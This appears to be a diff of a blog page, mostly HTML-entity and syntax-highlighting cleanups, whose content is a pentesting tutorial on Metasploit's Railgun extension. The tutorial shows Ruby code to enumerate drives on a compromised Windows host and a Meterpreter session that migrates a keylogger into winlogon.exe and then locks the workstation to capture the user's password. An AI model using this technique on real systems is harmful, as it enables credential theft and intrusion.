@@ -145,11 +145,11 @@ Basically what this allows you to do is make Windows API calls from Meterpreter 
 <li>advapi32</li>
 </ul>
 <p>(You can find out exactly what functions are available by default in the api.rb file)</p>
-<p>It's also very extensible, it doesn't have a DLL or function you need? But you can read all about in the manual:</p>
+<p>It&rsquo;s also very extensible, it doesn&rsquo;t have a DLL or function you need? But you can read all about in the manual:</p>
 <p><code>./external/source/meterpreter/source/extensions/railgun/railgun_manual.pdf</code></p>
 <p>Here are two examples where this comes in very handy:</p>
 <h2 id="list-drives">List Drives:</h2>
-<p>The problem that I've had on a number of pentests is that you get shell, but from CMD or Meterpreter there is no good way to find all of the volumes (drives) attached.</p>
+<p>The problem that I&rsquo;ve had on a number of pentests is that you get shell, but from CMD or Meterpreter there is no good way to find all of the volumes (drives) attached.</p>
 <ul>
 <li>net use - Shows you what Network drives are connected, but not physical ones</li>
 <li>fsutil fsinfo drives - You must be an administrator to ride this train</li>
@@ -159,48 +159,48 @@ Basically what this allows you to do is make Windows API calls from Meterpreter 
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby"><span style="color:#75715e"># Load the Railgun plugin  **_Update: You no longer need this step_**  </span>
 <span style="color:#75715e"># client.core.use(&#34;railgun&#34;)   </span>
 <span style="color:#75715e"># Make the API call to enum drive letters   </span>
-a <span style="color:#f92672">=</span> client<span style="color:#f92672">.</span>railgun<span style="color:#f92672">.</span>kernel32<span style="color:#f92672">.</span>GetLogicalDrives()<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">return</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">]</span>         
+a <span style="color:#f92672">=</span> client<span style="color:#f92672">.</span>railgun<span style="color:#f92672">.</span>kernel32<span style="color:#f92672">.</span>GetLogicalDrives()<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;return&#34;</span><span style="color:#f92672">]</span>         
 <span style="color:#75715e"># Math magic to convert the binary to letters        </span>
-drives <span style="color:#f92672">=</span> <span style="color:#f92672">[</span><span style="color:#f92672">]</span>         
-letters <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">ABCDEFGHIJKLMNOPQRSTUVWXYZ</span><span style="color:#e6db74">&#34;</span>         
-(<span style="color:#ae81ff">0</span><span style="color:#f92672"></span><span style="color:#f92672">..</span><span style="color:#ae81ff">25</span><span style="color:#f92672"></span>)<span style="color:#f92672">.</span>each <span style="color:#66d9ef">do</span> <span style="color:#f92672">|</span>i<span style="color:#f92672">|</span>        
-	test <span style="color:#f92672">=</span> letters<span style="color:#f92672">[</span>i,<span style="color:#ae81ff">1</span><span style="color:#f92672"></span><span style="color:#f92672">]</span>        
-	rem <span style="color:#f92672">=</span> a <span style="color:#f92672">%</span> (<span style="color:#ae81ff">2</span><span style="color:#f92672"></span><span style="color:#f92672">**</span>(i<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span><span style="color:#f92672"></span>))        
+drives <span style="color:#f92672">=</span> <span style="color:#f92672">[]</span>         
+letters <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#34;</span>         
+(<span style="color:#ae81ff">0</span><span style="color:#f92672">..</span><span style="color:#ae81ff">25</span>)<span style="color:#f92672">.</span>each <span style="color:#66d9ef">do</span> <span style="color:#f92672">|</span>i<span style="color:#f92672">|</span>        
+	test <span style="color:#f92672">=</span> letters<span style="color:#f92672">[</span>i,<span style="color:#ae81ff">1</span><span style="color:#f92672">]</span>        
+	rem <span style="color:#f92672">=</span> a <span style="color:#f92672">%</span> (<span style="color:#ae81ff">2</span><span style="color:#f92672">**</span>(i<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>))        
 	<span style="color:#66d9ef">if</span> rem <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>        
-		<span style="color:#f92672"></span>drives <span style="color:#f92672">&lt;&lt;</span> test        
+		drives <span style="color:#f92672">&lt;&lt;</span> test        
 		a <span style="color:#f92672">=</span> a <span style="color:#f92672">-</span> rem        
 	<span style="color:#66d9ef">end</span>        
 <span style="color:#66d9ef">end</span>         
-print_line(<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Drives Available = </span><span style="color:#e6db74">#{</span>drives<span style="color:#f92672">.</span>inspect<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+print_line(<span style="color:#e6db74">&#34;Drives Available = </span><span style="color:#e6db74">#{</span>drives<span style="color:#f92672">.</span>inspect<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
 </code></pre></div><p><strong>Output</strong>: <code>Drives Available = [&quot;A&quot;, &quot;C&quot;, &quot;D&quot;, &quot;P&quot;, &quot;X&quot;]</code></p>
-<p>Save this as a meterpreter script and it'll print every logical drive attached to the system even as a limited user (that the user can see).</p>
+<p>Save this as a meterpreter script and it&rsquo;ll print every logical drive attached to the system even as a limited user (that the user can see).</p>
 <p>Logical drives include: (hdd, network, mass storage, optical, etc). This opens up the doors to infecting USB sticks and network drives…</p>
 <h2 id="jedi-keylogging">JEDI KEYLOGGING:</h2>
-<p>One of the problems with keylogging is you never know when that person will log in, and if you're using a client side, they have probably already logged in and you're hoping they log into a portal or some other password protected site.</p>
+<p>One of the problems with keylogging is you never know when that person will log in, and if you&rsquo;re using a client side, they have probably already logged in and you&rsquo;re hoping they log into a portal or some other password protected site.</p>
 <p>Railgun to the rescue again:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby"><span style="color:#75715e"># Start the keylogger running in the background dumping keys every 15 seconds, attached to Winlogon**   </span>
 
-meterpreter <span style="color:#f92672">&gt;</span> bgrun keylogrecorder <span style="color:#f92672">-</span>c <span style="color:#ae81ff">1</span> <span style="color:#f92672"></span><span style="color:#f92672">-</span>t <span style="color:#ae81ff">15</span>        
-<span style="color:#f92672"></span><span style="color:#f92672">[</span><span style="color:#f92672">*</span><span style="color:#f92672">]</span> <span style="color:#66d9ef">Executed</span> <span style="color:#66d9ef">Meterpreter</span> with <span style="color:#66d9ef">Job</span> <span style="color:#66d9ef">ID</span> <span style="color:#ae81ff">0</span>        
-<span style="color:#f92672"></span>meterpreter <span style="color:#f92672">&gt;</span> <span style="color:#f92672">[</span><span style="color:#f92672">*</span><span style="color:#f92672">]</span> winlogon<span style="color:#f92672">.</span>exe <span style="color:#66d9ef">Process</span> found, migrating into <span style="color:#ae81ff">640</span>        
-<span style="color:#f92672"></span><span style="color:#f92672">[</span><span style="color:#f92672">*</span><span style="color:#f92672">]</span> <span style="color:#66d9ef">Migration</span> <span style="color:#66d9ef">Successful</span><span style="color:#f92672">!</span><span style="color:#f92672">!</span>        
-<span style="color:#f92672">[</span><span style="color:#f92672">*</span><span style="color:#f92672">]</span> <span style="color:#66d9ef">Starting</span> the keystroke sniffer<span style="color:#f92672">...</span>        
-<span style="color:#f92672">[</span><span style="color:#f92672">*</span><span style="color:#f92672">]</span> <span style="color:#66d9ef">Keystrokes</span> being saved <span style="color:#66d9ef">in</span> to <span style="color:#e6db74">/</span><span style="color:#e6db74">root</span><span style="color:#e6db74">/</span><span style="color:#f92672">.</span>msf3<span style="color:#f92672">/</span>logs<span style="color:#f92672">/</span>scripts<span style="color:#f92672">/</span>keylogrecorder<span style="color:#f92672">/</span><span style="color:#ae81ff">192</span><span style="color:#f92672"></span><span style="color:#f92672">.</span><span style="color:#ae81ff">168</span><span style="color:#f92672"></span><span style="color:#f92672">.</span><span style="color:#ae81ff">92</span><span style="color:#f92672"></span><span style="color:#f92672">.</span><span style="color:#ae81ff">122_20100707</span><span style="color:#f92672"></span><span style="color:#f92672">.</span><span style="color:#ae81ff">4539</span><span style="color:#f92672"></span><span style="color:#f92672">.</span>txt        
-<span style="color:#f92672">[</span><span style="color:#f92672">*</span><span style="color:#f92672">]</span> <span style="color:#66d9ef">Recording</span>         
+meterpreter <span style="color:#f92672">&gt;</span> bgrun keylogrecorder <span style="color:#f92672">-</span>c <span style="color:#ae81ff">1</span> <span style="color:#f92672">-</span>t <span style="color:#ae81ff">15</span>        
+<span style="color:#f92672">[*]</span> <span style="color:#66d9ef">Executed</span> <span style="color:#66d9ef">Meterpreter</span> with <span style="color:#66d9ef">Job</span> <span style="color:#66d9ef">ID</span> <span style="color:#ae81ff">0</span>        
+meterpreter <span style="color:#f92672">&gt;</span> <span style="color:#f92672">[*]</span> winlogon<span style="color:#f92672">.</span>exe <span style="color:#66d9ef">Process</span> found, migrating into <span style="color:#ae81ff">640</span>        
+<span style="color:#f92672">[*]</span> <span style="color:#66d9ef">Migration</span> <span style="color:#66d9ef">Successful</span><span style="color:#f92672">!!</span>        
+<span style="color:#f92672">[*]</span> <span style="color:#66d9ef">Starting</span> the keystroke sniffer<span style="color:#f92672">...</span>        
+<span style="color:#f92672">[*]</span> <span style="color:#66d9ef">Keystrokes</span> being saved <span style="color:#66d9ef">in</span> to <span style="color:#e6db74">/root/</span><span style="color:#f92672">.</span>msf3<span style="color:#f92672">/</span>logs<span style="color:#f92672">/</span>scripts<span style="color:#f92672">/</span>keylogrecorder<span style="color:#f92672">/</span><span style="color:#ae81ff">192</span><span style="color:#f92672">.</span><span style="color:#ae81ff">168</span><span style="color:#f92672">.</span><span style="color:#ae81ff">92</span><span style="color:#f92672">.</span><span style="color:#ae81ff">122_20100707</span><span style="color:#f92672">.</span><span style="color:#ae81ff">4539</span><span style="color:#f92672">.</span>txt        
+<span style="color:#f92672">[*]</span> <span style="color:#66d9ef">Recording</span>         
   
 <span style="color:#75715e"># Drop to IRB to initialize railgun and lockout the workstation, forcing the user to use their credentials again.**</span>
 
 meterpreter <span style="color:#f92672">&gt;</span> irb       
-<span style="color:#f92672">[</span><span style="color:#f92672">*</span><span style="color:#f92672">]</span> <span style="color:#66d9ef">Starting</span> <span style="color:#66d9ef">IRB</span> shell        
-<span style="color:#f92672">[</span><span style="color:#f92672">*</span><span style="color:#f92672">]</span> <span style="color:#66d9ef">The</span> <span style="color:#e6db74">&#39;client&#39;</span> variable holds the meterpreter client
+<span style="color:#f92672">[*]</span> <span style="color:#66d9ef">Starting</span> <span style="color:#66d9ef">IRB</span> shell        
+<span style="color:#f92672">[*]</span> <span style="color:#66d9ef">The</span> <span style="color:#e6db74">&#39;client&#39;</span> variable holds the meterpreter client
 
-client<span style="color:#f92672">.</span>core<span style="color:#f92672">.</span>use(<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">railgun</span><span style="color:#e6db74">&#34;</span>)       
-<span style="color:#f92672">=</span><span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">true</span>        
+client<span style="color:#f92672">.</span>core<span style="color:#f92672">.</span>use(<span style="color:#e6db74">&#34;railgun&#34;</span>)       
+<span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">true</span>        
 client<span style="color:#f92672">.</span>railgun<span style="color:#f92672">.</span>user32<span style="color:#f92672">.</span>LockWorkStation()        
-<span style="color:#f92672">=</span><span style="color:#f92672">&gt;</span> {<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">GetLastError</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">=</span><span style="color:#f92672">&gt;</span><span style="color:#ae81ff">0</span><span style="color:#f92672"></span>, <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">return</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">=</span><span style="color:#f92672">&gt;</span><span style="color:#66d9ef">true</span>}        
+<span style="color:#f92672">=&gt;</span> {<span style="color:#e6db74">&#34;GetLastError&#34;</span><span style="color:#f92672">=&gt;</span><span style="color:#ae81ff">0</span>, <span style="color:#e6db74">&#34;return&#34;</span><span style="color:#f92672">=&gt;</span><span style="color:#66d9ef">true</span>}        
 exit        
 meterpreter <span style="color:#f92672">&gt;</span>
-</code></pre></div><p>Set up &ldquo;tail -f&rdquo; going on the log file for the keylogger and then kill the keylogger when you've gotten what you came for.</p>
+</code></pre></div><p>Set up &ldquo;tail -f&rdquo; going on the log file for the keylogger and then kill the keylogger when you&rsquo;ve gotten what you came for.</p>
 <pre><code>meterpreter &gt; bglist       
 [*] Job 0: [&quot;keylogrecorder&quot;, &quot;-c&quot;, &quot;1&quot;, &quot;-t&quot;, &quot;15&quot;]        
 meterpreter &gt; bgkill 0        
